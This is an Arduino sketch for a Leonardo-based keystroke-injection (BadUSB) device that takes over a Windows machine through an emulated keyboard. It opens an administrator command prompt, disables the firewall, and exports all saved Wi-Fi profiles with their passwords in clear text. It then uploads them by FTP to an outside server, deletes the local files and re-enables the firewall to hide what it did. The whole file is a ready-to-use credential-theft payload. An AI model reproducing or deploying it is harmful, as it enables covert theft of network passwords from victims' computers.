#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("netsh advfirewall set currentprofile state off");
  delay(3000);
  Keyboard.println("cd %USERPROFILE%");
  delay(3000);
  Keyboard.println("netsh wlan export profile key=clear");
  delay(3000);
  Keyboard.println("ftp -i seridorftp");
  delay(10000);
  Keyboard.println("username");
  delay(3000);
  Keyboard.println("password");
  delay(3000);
  Keyboard.println("prompt");
  delay(3000);
  Keyboard.println("prompt");
  delay(3000);
  Keyboard.println("MPUT *.xml");
  delay(3000);
  Keyboard.println("bye");
  delay(3000);
  Keyboard.println("del *.xml");
  delay(3000);
  Keyboard.println("netsh advfirewall set currentprofile state on");
  delay(3000);
  Keyboard.println("exit");
  while(1);
}
